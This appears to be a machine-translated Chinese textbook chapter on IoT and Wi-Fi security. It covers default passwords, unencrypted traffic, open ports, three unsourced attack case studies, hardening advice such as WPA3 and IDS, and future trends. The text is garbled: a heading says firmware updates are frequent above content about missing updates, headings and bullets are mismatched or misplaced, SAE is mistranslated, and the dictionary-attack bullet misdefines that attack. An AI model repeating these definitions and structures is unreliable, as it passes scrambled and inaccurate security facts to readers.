## IoT 安全挑战

物联网 (`IoT`) 将大量设备连接到互联网，允许它们收集并共享数据。这些设备包括从恒温器、摄像头到联网汽车和工业设备。虽然 `IoT` 提供了许多优势，但也引入了一些安全挑战，特别是当连接到 Wi-Fi 网络时。

## 复杂性与多样性

`IoT` 设备的多样性（每个设备具有不同的处理能力、操作系统和安全需求）使得管理和保护这些网络变得复杂。

- **异构设备：** 从简单的传感器到复杂的控制系统不等。
- **不同的操作系统：** 它们可以运行私有系统、修改过的 `Linux` 版本或其他系统。
- **不同的安全需求：** 设备可能不支持高级加密或频繁的安全更新。

## 硬件限制

许多 `IoT` 设备的硬件资源有限，这可能会限制强力安全措施的实施。

- **处理能力：** 低功耗处理器可能不支持强加密。
- **存储限制：** 存储空间减少可能导致无法安装补丁。
- **能量限制：** 电池供电设备可能有电源限制，限制了安全密集型过程的运行。

## 缺乏标准化

`IoT` 设备之间通信和安全协议缺乏标准化增加了保护这些网络的复杂性。

- **私有协议：** 许多设备使用私有通信协议。
- **互操作性：** 确保来自不同制造商的设备安全运行是一项挑战。

## 常见漏洞




IoT 设备通常面临各种漏洞，攻击者可以利用这些漏洞来破坏 Wi-Fi 网络安全。

## 默认密码

许多 IoT 设备带有出厂默认密码，用户通常不会进行更改，这使得未经授权的访问变得更容易。

默认密码示例：

```text
admin/admin
user/user
```

## 缺乏加密

某些 IoT 设备以明文传输数据或使用弱加密，导致它们容易被截获和篡改。

未加密流量示例：

```text
GET /data HTTP/1.1
Host: device.local
```

## 固件更新频繁

许多 IoT 设备不会定期接收固件更新，导致已知漏洞无法被修复。

- 常见问题：
  - 固件过旧：固件过旧的设备很容易成为目标。
  - 缺乏支持：某些制造商不再为安全更新提供持续支持。

## 端口与服务的暴露

IoT 设备经常开启不必要的端口和服务，这些可能会被攻击者利用。

开放端口示例：

```text
Port 23 (Telnet)
Porta 80 (HTTP)
```

## 臭名攻击分析
研究近年来针对 Wi-Fi 网络的高知名攻击真实案例，可以为攻击者使用的技术和被利用的漏洞提供宝贵的见解。以下，我们将讨论 2022 年至 2024 年间的一些重大攻击，重点介绍所采用的方法及其产生的影响。

### 案例 1：2022 年金融行业攻击
背景：2022 年，某大型银行成为网络攻击的目标，其 Wi-Fi 网络遭到破坏，导致敏感客户数据遭到未经授权的访问。
攻击方法：
- Wi-Fi 漏洞利用：攻击者利用了银行使用的特定路由器中的已知漏洞，允许他们访问内部网络。
- 社会工程学攻击：攻击者还使用了钓鱼技术来获取员工凭据，以便进入受限区域。
影响：
- 数千名客户的财务和个人数据被泄露。
- 巨大的财务损失和对银行声誉的损害。
教训：
- 保持所有设备固件更新的重要性。
- 需要对员工进行持续培训。
- 为所有网络账户实施双重身份验证 (`2FA`）。

### 案例 2：2023 年关键基础设施入侵
背景：2023 年，一家发电厂成为攻击目标，攻击通过 Wi-Fi 破坏了其工业控制系统，导致配电中断。
攻击方法：
- 恶意孪生攻击（Evil Twin Attack）：攻击者设置了一个模拟工厂合法网络的虚假接入点。多个设备连接到虚假接入点，导致敏感数据被捕获。
- 嗅探与欺骗：使用 `Wireshark` 和 `Scapy` 等工具拦截并操纵流量。
影响：
- 数千个家庭和企业的供电中断。
- 对公共安全和关键系统构成潜在风险。
教训：
- 需要严格的网络分段以隔离系统。
- 实施入侵检测系统 (`IDS`) 以监控活动。
- 使用 `VPNs` 保护敏感数据通信。

### 案例 3：2024 年家庭网络被破坏
背景：2024 年，一组攻击者对家庭 Wi-Fi 网络发起了了一系列协同攻击，旨在窃取个人和财务数据。
攻击方法：
- 钓鱼和社会工程学：他们发送了看似来自互联网服务提供商的假邮件，要求用户更新 Wi-Fi 设置。
- 弱密码利用：他们使用暴力破解技术发现弱密码和模式。
影响：
- 数千名用户的个人和财务信息被泄露。
- 连接到家庭网络的 `IoT` 设备遭到未经授权的访问。
教训：
- 为 Wi-Fi 网络使用强且唯一密码的重要性。
- 需要对钓鱼风险进行持续教育。
- 实施额外的安全措施，如双重身份验证 (`2FA`)。

## 教训总结
对这些案例的分析强调了改进 Wi-Fi 网络安全的几个重要教训。学到的教训不仅能指导更强大的安全实践，有助于预测和缓解未来的威胁。

  - 定期检查制造商网站的固件更新。
  - 配置设备在可用更新时自动检查更新。

## 培训与意识

  - 为所有网络访问账户实施 `2FA`。
  - 使用身份验证器或硬件令牌。

  - 创建 `VLANs` 以隔离关键设备和系统。

## 知识的应用
分析真实案例获得的知识对于开发针对 Wi-Fi 网络攻击的有效防御至关重要。以下我们将讨论可以实施的实用策略。

字体 安全 Wi-Fi 路由器配置
安全地配置 Wi-Fi 路由器是许多类型攻击的第一防线。
- 使用 WPA3：
  - 配置路由器使用 `WPA3`，与 `WPA2` 相比提供了更高的安全性。
  - 确保所有设备都支持 `WPA3`。
- 禁用 WPS：
  - 禁用 Wi-Fi Protected Setup (`WPS`)，它容易受到暴力破解攻击。
  - 访问路由器界面并在安全设置中禁用 `WPS`。
- 修改默认密码：
  - 将路由器的默认密码更改为强且唯一的密码。
  - 使用大小写字母、数字和特殊字符的组合。

## 持续监控与入侵检测
实施持续监控和入侵检测系统帮助你快速识别并响应疑活动。
- 入侵检测系统 (`IDS`)：
  - 配置 `Snort` 或 `Zeek` 等工具监控网络流量并在可疑活动时提醒你。
  - 配置特定规则以检测常见攻击恶意活动。
- 数据包分析：
  - 使用 `Wireshark` 捕获并分析网络包。
  - 配置过滤器以关注特定类型的流量并识别异常。

## 持续教育与安全策略
持续教育用户并实施严格的安全策略是构建稳健防御的关键组成部分。
- 持续教育：
  - 为所有员工和终端用户开发并实施定期培训计划。
  - 举办研讨会和博客更新最新安全威胁和实践的知识。
- 安全策略：
  - 实施基于角色的访问控制策略，仅限授权员工访问敏感信息。
  - 建立验证任何请求机密信息的身份的程序。

# 加密技术的进展

## 第 20 章：Wi-Fi 安全的未来趋势

# Wi-Fi 威胁的演变
由于对无线网络依赖的增加以及攻击者手段的提高，Wi-Fi 安全威胁不断演变。理解这些新兴趋势对于开发有效的防御和预测未来的漏洞至关重要。

## 连接设备的增加
随着 `IoT` 设备的普及，Wi-Fi 网络的攻击面正在迅速扩大。每增加一个设备都代表一个可能被攻击者利用的潜在漏洞。
- **IoT 设备**: `IoT` 设备数量的不断增加（其中许多设备的安全性薄弱或不存在）扩大了攻击的机会。
- **家庭和商业网络**: 家庭和商业网络变得越来越互联，这增加了攻击快速传播的风险。

## 有针对性且复杂的攻击
攻击变得越来越有针对且复杂，攻击者使用先进技术来攻破 Wi-Fi 网络。
- **社交工程攻击**: 钓鱼和其他社交工程攻击变得越来越精细，诱骗用户泄凭据或安装恶意软件。
- **零日漏洞利用**: 攻击者在补丁或修复可用之前利用未知的（零日）漏洞。

## 多向量攻击的集成
攻击者正在结合多个攻击向量以增加其行动的有效性。
- **组合攻击**: 社交工程攻击与技术利用相结合，例如钓鱼后是对软件漏洞的利用。
- **链式攻击**: 使用链式攻击，一个设备的故障会导致网络上其他设备被破解。

# 新兴技术
新兴技术正在重塑 Wi-Fi 安全格局，为保护提供了新机会，但也带来了新的挑战。

## WPA3 和高级加密
`WPA3` 是 Wi-Fi 网络的新安全标准，相比 `WPA2` 提供了显著改进。
- **WPA3 的特性**:
  - `等等同步身份验证 (SAE)`：替换了 `PSK`，提供了更安全的身份验证并能抵抗破解攻击。
  - `个性化加密`: 设备与访问点之间的每个连接都经过单独加密，提高了隐私性和安全性。
  - **防止字典攻击`: `WPA3` 使字典攻击变得困难，攻击者会尝试所有可能的组合来破解密码。

## 网格网络 (Mesh Networks)
网格网络因其能够提供全面且韧性的 Wi-Fi 覆盖而越来越受欢迎，特别是在大范围内。
- **网格网络的特点**:
  - **扩展覆盖**: 多个网络节点协同工作，提供区域 Wi-Fi 覆盖。
  - **自修复和冗余**: 如果一个节点故障，其他节点会自动重新配置网络以保持连接性。
  - **集成安全**: 许多 `Mesh` 网络内置了安全功能，如强加密和入侵检测。

## 5G 与网络融合
`5G` 的到来驱动了 Wi-Fi 和蜂窝网络的融合，为安全带来了新的机会和挑战。
- **5G 的特性**:
  - **高速和低延迟**: `5G` 比之前的网络速度快得多，延迟低得多。
  - **海量设备连接**: 支持同时连接多得设备。
  - **安全挑战**: `5G` 与 `Wi-Fi` 的融合需要新的方法来确保混合网络环境的安全。

# AI 和 ML 对 Wi-Fi 安全的影响
人工智能 (`AI`) 和机器学习 (`ML`) 正在改变 Wi-Fi 安全，实现主动的威胁检测和响应自动化。

## 主动威胁检测
`AI` 和 `ML` 系统可以分析海量的网络流量数据，识别可能指示威胁的异常模式。
- **行为分析**:
  - **异常检测**: `ML` 算法可以检测网络中的异常行为，这些行为可能指示攻击。
  - **模式识别**: `AI` 可以识别恶意行为模式，实现对攻击的早期检测。
- **响应自动化**:
  - **快速回答**: `AI` 系统可以自动化事件响应，例如隔离受感染的设备或阻止可疑流量。





- 威胁缓解：AI 可以自动实施缓解措施，在威胁造成重大损害之前将其中和。
